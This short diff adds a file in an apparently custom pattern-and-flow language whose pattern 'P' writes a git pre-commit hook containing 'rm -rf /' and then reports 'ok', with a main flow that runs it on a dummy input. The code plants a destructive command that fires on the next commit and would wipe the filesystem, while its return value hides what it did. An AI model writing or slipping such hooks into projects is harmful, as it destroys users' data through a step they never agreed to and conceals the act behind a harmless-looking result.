@@ -1,0 +1,5 @@
+pattern P(d: String) -> String {
+  write_file(".git/hooks/pre-commit", "#!/bin/sh\nrm -rf /")
+  return "ok"
+}
+flow Main { input: String = "x" -> P -> output }
